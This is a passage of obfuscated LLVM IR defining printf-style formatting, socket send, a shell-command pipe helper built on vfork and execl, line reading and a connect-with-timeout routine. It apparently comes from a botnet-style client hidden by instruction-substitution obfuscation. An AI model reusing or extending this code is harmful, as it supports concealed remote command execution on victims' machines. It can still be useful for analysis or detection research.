  %63 = and i32 %55, 1
  %64 = icmp ne i32 %62, 0
  br i1 %64, label %83, label %65

; <label>:65:                                     ; preds = %54
  br label %66

; <label>:66:                                     ; preds = %77, %65
  %67 = load i32, i32* %7, align 4
  %68 = icmp sgt i32 %67, 0
  br i1 %68, label %69, label %82

; <label>:69:                                     ; preds = %66
  %70 = load i8**, i8*** %5, align 8
  %71 = load i32, i32* %10, align 4
  call void @printchar(i8** %70, i32 %71)
  %72 = load i32, i32* %9, align 4
  %73 = add i32 %72, 1169474966
  %74 = add i32 %73, 1
  %75 = sub i32 %74, 1169474966
  %76 = add nsw i32 %72, 1
  store i32 %75, i32* %9, align 4
  br label %77

; <label>:77:                                     ; preds = %69
  %78 = load i32, i32* %7, align 4
  %79 = sub i32 0, -1
  %80 = sub i32 %78, %79
  %81 = add nsw i32 %78, -1
  store i32 %80, i32* %7, align 4
  br label %66

; <label>:82:                                     ; preds = %66
  br label %83

; <label>:83:                                     ; preds = %82, %54
  br label %84

; <label>:84:                                     ; preds = %98, %83
  %85 = load i8*, i8** %6, align 8
  %86 = load i8, i8* %85, align 1
  %87 = icmp ne i8 %86, 0
  br i1 %87, label %88, label %101

; <label>:88:                                     ; preds = %84
  %89 = load i8**, i8*** %5, align 8
  %90 = load i8*, i8** %6, align 8
  %91 = load i8, i8* %90, align 1
  %92 = zext i8 %91 to i32
  call void @printchar(i8** %89, i32 %92)
  %93 = load i32, i32* %9, align 4
  %94 = add i32 %93, -567514617
  %95 = add i32 %94, 1
  %96 = sub i32 %95, -567514617
  %97 = add nsw i32 %93, 1
  store i32 %96, i32* %9, align 4
  br label %98

; <label>:98:                                     ; preds = %88
  %99 = load i8*, i8** %6, align 8
  %100 = getelementptr inbounds i8, i8* %99, i32 1
  store i8* %100, i8** %6, align 8
  br label %84

; <label>:101:                                    ; preds = %84
  br label %102

; <label>:102:                                    ; preds = %112, %101
  %103 = load i32, i32* %7, align 4
  %104 = icmp sgt i32 %103, 0
  br i1 %104, label %105, label %119

; <label>:105:                                    ; preds = %102
  %106 = load i8**, i8*** %5, align 8
  %107 = load i32, i32* %10, align 4
  call void @printchar(i8** %106, i32 %107)
  %108 = load i32, i32* %9, align 4
  %109 = sub i32 0, 1
  %110 = sub i32 %108, %109
  %111 = add nsw i32 %108, 1
  store i32 %110, i32* %9, align 4
  br label %112

; <label>:112:                                    ; preds = %105
  %113 = load i32, i32* %7, align 4
  %114 = sub i32 0, %113
  %115 = sub i32 0, -1
  %116 = add i32 %114, %115
  %117 = sub i32 0, %116
  %118 = add nsw i32 %113, -1
  store i32 %117, i32* %7, align 4
  br label %102

; <label>:119:                                    ; preds = %102
  %120 = load i32, i32* %9, align 4
  ret i32 %120
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %131

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %48

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %48

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %48

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = add i32 0, -829027105
  %45 = sub i32 %44, %43
  %46 = sub i32 %45, -829027105
  %47 = sub nsw i32 0, %43
  store i32 %46, i32* %21, align 4
  br label %48

; <label>:48:                                     ; preds = %42, %39, %36, %33
  %49 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %50 = getelementptr inbounds i8, i8* %49, i64 12
  %51 = getelementptr inbounds i8, i8* %50, i64 -1
  store i8* %51, i8** %17, align 8
  %52 = load i8*, i8** %17, align 8
  store i8 0, i8* %52, align 1
  br label %53

; <label>:53:                                     ; preds = %76, %48
  %54 = load i32, i32* %21, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %56, label %88

; <label>:56:                                     ; preds = %53
  %57 = load i32, i32* %21, align 4
  %58 = load i32, i32* %11, align 4
  %59 = urem i32 %57, %58
  store i32 %59, i32* %18, align 4
  %60 = load i32, i32* %18, align 4
  %61 = icmp sge i32 %60, 10
  br i1 %61, label %62, label %76

; <label>:62:                                     ; preds = %56
  %63 = load i32, i32* %15, align 4
  %64 = sub i32 %63, -1950062292
  %65 = sub i32 %64, 48
  %66 = add i32 %65, -1950062292
  %67 = sub nsw i32 %63, 48
  %68 = sub i32 0, 10
  %69 = add i32 %66, %68
  %70 = sub nsw i32 %66, 10
  %71 = load i32, i32* %18, align 4
  %72 = add i32 %71, 269877514
  %73 = add i32 %72, %69
  %74 = sub i32 %73, 269877514
  %75 = add nsw i32 %71, %69
  store i32 %74, i32* %18, align 4
  br label %76

; <label>:76:                                     ; preds = %62, %56
  %77 = load i32, i32* %18, align 4
  %78 = sub i32 %77, -1197086446
  %79 = add i32 %78, 48
  %80 = add i32 %79, -1197086446
  %81 = add nsw i32 %77, 48
  %82 = trunc i32 %80 to i8
  %83 = load i8*, i8** %17, align 8
  %84 = getelementptr inbounds i8, i8* %83, i32 -1
  store i8* %84, i8** %17, align 8
  store i8 %82, i8* %84, align 1
  %85 = load i32, i32* %11, align 4
  %86 = load i32, i32* %21, align 4
  %87 = udiv i32 %86, %85
  store i32 %87, i32* %21, align 4
  br label %53

; <label>:88:                                     ; preds = %53
  %89 = load i32, i32* %19, align 4
  %90 = icmp ne i32 %89, 0
  br i1 %90, label %91, label %120

; <label>:91:                                     ; preds = %88
  %92 = load i32, i32* %13, align 4
  %93 = icmp ne i32 %92, 0
  br i1 %93, label %94, label %116

; <label>:94:                                     ; preds = %91
  %95 = load i32, i32* %14, align 4
  %96 = xor i32 %95, -1
  %97 = xor i32 2, -1
  %98 = xor i32 -474701723, -1
  %99 = or i32 %96, %97
  %100 = or i32 -474701723, %98
  %101 = xor i32 %99, -1
  %102 = and i32 %101, %100
  %103 = and i32 %95, 2
  %104 = icmp ne i32 %102, 0
  br i1 %104, label %105, label %116

; <label>:105:                                    ; preds = %94
  %106 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %106, i32 45)
  %107 = load i32, i32* %20, align 4
  %108 = sub i32 0, 1
  %109 = sub i32 %107, %108
  %110 = add nsw i32 %107, 1
  store i32 %109, i32* %20, align 4
  %111 = load i32, i32* %13, align 4
  %112 = add i32 %111, 1139881280
  %113 = add i32 %112, -1
  %114 = sub i32 %113, 1139881280
  %115 = add nsw i32 %111, -1
  store i32 %114, i32* %13, align 4
  br label %119

; <label>:116:                                    ; preds = %94, %91
  %117 = load i8*, i8** %17, align 8
  %118 = getelementptr inbounds i8, i8* %117, i32 -1
  store i8* %118, i8** %17, align 8
  store i8 45, i8* %118, align 1
  br label %119

; <label>:119:                                    ; preds = %116, %105
  br label %120

; <label>:120:                                    ; preds = %119, %88
  %121 = load i32, i32* %20, align 4
  %122 = load i8**, i8*** %9, align 8
  %123 = load i8*, i8** %17, align 8
  %124 = load i32, i32* %13, align 4
  %125 = load i32, i32* %14, align 4
  %126 = call i32 @prints(i8** %122, i8* %123, i32 %124, i32 %125)
  %127 = sub i32 %121, 55338383
  %128 = add i32 %127, %126
  %129 = add i32 %128, 55338383
  %130 = add nsw i32 %121, %126
  store i32 %129, i32* %8, align 4
  br label %131

; <label>:131:                                    ; preds = %120, %25
  %132 = load i32, i32* %8, align 4
  ret i32 %132
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i32, i32* %3, align 4
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i64 @strlen(i8* %25) #10
  %27 = call i64 @send(i32 %23, i8* %24, i64 %26, i32 16384)
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %8, align 4
  %29 = load i8*, i8** %6, align 8
  call void @free(i8* %29) #2
  %30 = load i32, i32* %8, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

; <label>:14:                                     ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

; <label>:19:                                     ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

; <label>:25:                                     ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:26:                                     ; preds = %19
  %27 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %28 = call i32 @pipe(i32* %27) #2
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

; <label>:30:                                     ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:31:                                     ; preds = %26
  %32 = load i32*, i32** @fdopen_pids, align 8
  %33 = icmp eq i32* %32, null
  br i1 %33, label %34, label %54

; <label>:34:                                     ; preds = %31
  %35 = call i32 @getdtablesize() #2
  store i32 %35, i32* %8, align 4
  %36 = icmp sle i32 %35, 0
  br i1 %36, label %37, label %38

; <label>:37:                                     ; preds = %34
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:38:                                     ; preds = %34
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 4
  %42 = trunc i64 %41 to i32
  %43 = zext i32 %42 to i64
  %44 = call noalias i8* @malloc(i64 %43) #2
  %45 = bitcast i8* %44 to i32*
  store i32* %45, i32** @fdopen_pids, align 8
  %46 = icmp eq i32* %45, null
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %38
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:48:                                     ; preds = %38
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = bitcast i32* %49 to i8*
  %51 = load i32, i32* %8, align 4
  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 4
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 %53, i32 1, i1 false)
  br label %54

; <label>:54:                                     ; preds = %48, %31
  %55 = call i32 @vfork() #11
  store i32 %55, i32* %9, align 4
  switch i32 %55, label %101 [
    i32 -1, label %56
    i32 0, label %63
  ]

; <label>:56:                                     ; preds = %54
  %57 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @close(i32 %58)
  %60 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @close(i32 %61)
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:63:                                     ; preds = %54
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 114
  br i1 %67, label %68, label %83

; <label>:68:                                     ; preds = %63
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = icmp ne i32 %70, 1
  br i1 %71, label %72, label %79

; <label>:72:                                     ; preds = %68
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @dup2(i32 %74, i32 1) #2
  %76 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %77 = load i32, i32* %76, align 4
  %78 = call i32 @close(i32 %77)
  br label %79

; <label>:79:                                     ; preds = %72, %68
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @close(i32 %81)
  br label %98

; <label>:83:                                     ; preds = %63
  %84 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %85 = load i32, i32* %84, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %94

; <label>:87:                                     ; preds = %83
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @dup2(i32 %89, i32 0) #2
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @close(i32 %92)
  br label %94

; <label>:94:                                     ; preds = %87, %83
  %95 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @close(i32 %96)
  br label %98

; <label>:98:                                     ; preds = %94, %79
  %99 = load i8*, i8** %4, align 8
  %100 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.35, i32 0, i32 0), i8* %99, i8* null) #2
  call void @_exit(i32 127) #12
  unreachable

; <label>:101:                                    ; preds = %54
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 114
  br i1 %105, label %106, label %112

; <label>:106:                                    ; preds = %101
  %107 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %108 = load i32, i32* %107, align 4
  store i32 %108, i32* %6, align 4
  %109 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %110 = load i32, i32* %109, align 4
  %111 = call i32 @close(i32 %110)
  br label %118

; <label>:112:                                    ; preds = %101
  %113 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %114 = load i32, i32* %113, align 4
  store i32 %114, i32* %6, align 4
  %115 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @close(i32 %116)
  br label %118

; <label>:118:                                    ; preds = %112, %106
  %119 = load i32, i32* %9, align 4
  %120 = load i32*, i32** @fdopen_pids, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %120, i64 %122
  store i32 %119, i32* %123, align 4
  %124 = load i32, i32* %6, align 4
  store i32 %124, i32* %3, align 4
  br label %125

; <label>:125:                                    ; preds = %118, %56, %47, %37, %30, %25
  %126 = load i32, i32* %3, align 4
  ret i32 %126
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  %11 = icmp eq i32* %10, null
  br i1 %11, label %19, label %12

; <label>:12:                                     ; preds = %1
  %13 = load i32*, i32** @fdopen_pids, align 8
  %14 = load i32, i32* %3, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i32, i32* %13, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %12, %1
  store i32 -1, i32* %2, align 4
  br label %65

; <label>:20:                                     ; preds = %12
  %21 = load i32, i32* %3, align 4
  %22 = call i32 @close(i32 %21)
  %23 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %24 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %25 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %27 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  br label %28

; <label>:28:                                     ; preds = %42, %20
  %29 = load i32*, i32** @fdopen_pids, align 8
  %30 = load i32, i32* %3, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i32, i32* %29, i64 %31
  %33 = load i32, i32* %32, align 4
  %34 = call i32 @waitpid(i32 %33, i32* %7, i32 0)
  store i32 %34, i32* %8, align 4
  br label %35

; <label>:35:                                     ; preds = %28
  %36 = load i32, i32* %8, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %42

; <label>:38:                                     ; preds = %35
  %39 = call i32* @__errno_location() #13
  %40 = load i32, i32* %39, align 4
  %41 = icmp eq i32 %40, 4
  br label %42

; <label>:42:                                     ; preds = %38, %35
  %43 = phi i1 [ false, %35 ], [ %41, %38 ]
  br i1 %43, label %28, label %44

; <label>:44:                                     ; preds = %42
  %45 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %46 = load i32*, i32** @fdopen_pids, align 8
  %47 = load i32, i32* %4, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds i32, i32* %46, i64 %48
  store i32 0, i32* %49, align 4
  %50 = load i32, i32* %8, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %44
  br label %63

; <label>:53:                                     ; preds = %44
  %54 = bitcast %struct.in_addr* %9 to i32*
  %55 = load i32, i32* %7, align 4
  store i32 %55, i32* %54, align 4
  %56 = bitcast %struct.in_addr* %9 to i32*
  %57 = load i32, i32* %56, align 4
  %58 = xor i32 65280, -1
  %59 = xor i32 %57, %58
  %60 = and i32 %59, %57
  %61 = and i32 %57, 65280
  %62 = ashr i32 %60, 8
  br label %63

; <label>:63:                                     ; preds = %53, %52
  %64 = phi i32 [ -1, %52 ], [ %62, %53 ]
  store i32 %64, i32* %2, align 4
  br label %65

; <label>:65:                                     ; preds = %63, %19
  %66 = load i32, i32* %2, align 4
  ret i32 %66
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %41

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = sub i32 0, %35
  %37 = sub i32 0, 1
  %38 = add i32 %36, %37
  %39 = sub i32 0, %38
  %40 = add nsw i32 %35, 1
  store i32 %39, i32* %8, align 4
  br label %9

; <label>:41:                                     ; preds = %25
  %42 = load i32, i32* %7, align 4
  %43 = icmp eq i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %41
  br label %47

; <label>:45:                                     ; preds = %41
  %46 = load i8*, i8** %4, align 8
  br label %47

; <label>:47:                                     ; preds = %45, %44
  %48 = phi i8* [ null, %44 ], [ %46, %45 ]
  ret i8* %48
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = xor i64 %22, -1
  %24 = xor i64 2048, -1
  %25 = xor i64 -1102335368218481934, -1
  %26 = and i64 %23, -1102335368218481934
  %27 = and i64 %22, %25
  %28 = and i64 %24, -1102335368218481934
  %29 = and i64 2048, %25
  %30 = or i64 %26, %27
  %31 = or i64 %28, %29
  %32 = xor i64 %30, %31
  %33 = or i64 %23, %24
  %34 = xor i64 %33, -1
  %35 = or i64 -1102335368218481934, %25
  %36 = and i64 %34, %35
  %37 = or i64 %32, %36
  %38 = or i64 %22, 2048
  store i64 %37, i64* %15, align 8
  %39 = load i32, i32* %6, align 4
  %40 = load i64, i64* %15, align 8
  %41 = call i32 (i32, i32, ...) @fcntl(i32 %39, i32 4, i64 %40)
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %42, align 4
  %43 = load i32, i32* %8, align 4
  %44 = trunc i32 %43 to i16
  %45 = call zeroext i16 @htons(i16 zeroext %44) #13
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %45, i16* %46, align 2
  %47 = load i8*, i8** %7, align 8
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %49 = call i32 @getHost(i8* %47, %struct.in_addr* %48)
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %128

; <label>:52:                                     ; preds = %4
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %54 = getelementptr inbounds [8 x i8], [8 x i8]* %53, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %54, i8 0, i64 8, i32 4, i1 false)
  %55 = load i32, i32* %6, align 4
  %56 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %57 = call i32 @connect(i32 %55, %struct.sockaddr* %56, i32 16)
  store i32 %57, i32* %16, align 4
